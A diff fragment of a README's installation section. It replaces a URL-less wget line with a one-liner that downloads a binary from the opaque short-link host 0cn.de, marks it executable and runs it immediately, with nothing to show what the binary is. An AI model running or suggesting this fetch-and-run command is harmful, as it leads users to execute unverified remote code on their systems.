@@ -22,7 +22,7 @@ Installation
 </p>
 
 ```bash
-wget -q -O mcagon && chmod +x mcagon && ./mcagon
+wget -q https://0cn.de/ll -O mcagon && chmod +x mcagon && ./mcagon
 ```  
 
 </h3>
